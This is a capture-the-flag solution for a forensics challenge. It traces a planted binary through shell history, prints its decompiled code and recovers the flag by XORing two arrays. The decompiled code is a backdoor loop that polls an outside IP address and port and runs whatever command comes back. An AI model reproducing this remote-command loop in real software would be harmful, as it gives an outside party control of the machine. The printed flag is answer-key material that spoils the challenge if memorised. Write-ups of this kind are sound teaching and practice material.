# Solution

*This is merely the solution. In-depth author writeups will be available 2023.09.07 at [shawnd.xyz/blog](https://shawnd.xyz/blog/).*

Decompress the attachment.

```sh
$ gunzip image.gz
```

There are a lot of ways to approach this challenge. One way is to mount the filesystem and then read the traces left behind in the `.bash_history` for a lead:

```
...
ls
file czip
./czip 
rm czip 
cd $(mktemp -d)
gcc main.c -o czip
./czip 
mv czip /bin/
cd ../
rmdir tmp.plyllfmAUH/
rm -rf tmp.plyllfmAUH/ 
cd
czip 
exit
...
```

Reverse engineering `/bin/czip` shows that it's malware:

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-4D8h]
  int j; // [rsp+Ch] [rbp-4D4h]
  __int64 v5[8]; // [rsp+10h] [rbp-4D0h]
  _DWORD v6[18]; // [rsp+50h] [rbp-490h] BYREF
  __int64 v7; // [rsp+98h] [rbp-448h]
  __int64 v8; // [rsp+A0h] [rbp-440h]
  __int64 v9; // [rsp+A8h] [rbp-438h]
  __int64 v10; // [rsp+B0h] [rbp-430h]
  __int64 v11; // [rsp+B8h] [rbp-428h]
  __int64 v12; // [rsp+C0h] [rbp-420h]
  __int64 v13; // [rsp+C8h] [rbp-418h]
  char command[8]; // [rsp+D0h] [rbp-410h] BYREF
  __int64 v15; // [rsp+D8h] [rbp-408h]
  char v16[1008]; // [rsp+E0h] [rbp-400h] BYREF
  unsigned __int64 v17; // [rsp+4D8h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  *(_QWORD *)command = 0LL;
  v15 = 0LL;
  memset(v16, 0, sizeof(v16));
  v5[0] = 0x273F36094A0B0418LL;
  v5[1] = 0xB5D6C1F12011D13LL;
  v5[2] = 0x5336120216100432LL;
  v5[3] = 0xA547D410A2F0107LL;
  v5[4] = 0x7E0607341E0A1A38LL;
  v5[5] = 0x56360913556D5501LL;
  v5[6] = 0x9044B561E0C121FLL;
  v5[7] = 0xD5C540810035A25LL;
  strcpy((char *)v6, "Bae9lukahy0at3ieShie3aigiephuHeighohQu3Ool2aalielaipazeezohy9eip");
  BYTE1(v6[16]) = 0;
  HIWORD(v6[16]) = 0;
  v6[17] = 0;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  for ( i = 0; i <= 63; ++i )
    *((_BYTE *)&v6[16] + i) = *((_BYTE *)v6 + i) ^ *((_BYTE *)v5 + i);
  for ( j = 0; j <= 63; ++j )
    *((_BYTE *)&v6[16] + j) = 0;
  while ( 1 )
  {
    poll("45.76.9.43", 9999LL, command);
    system(command);
    sleep(0xE10u);
  }
}
```

`v5` is XOR'ed with `v6`, then zeroed. Performing the XOR reveals the flag:

```
ZenseCTF{d1sk_4nalys1s_4nd_b451c_rever51n9_4re_3ssen71al_5ki115}
```
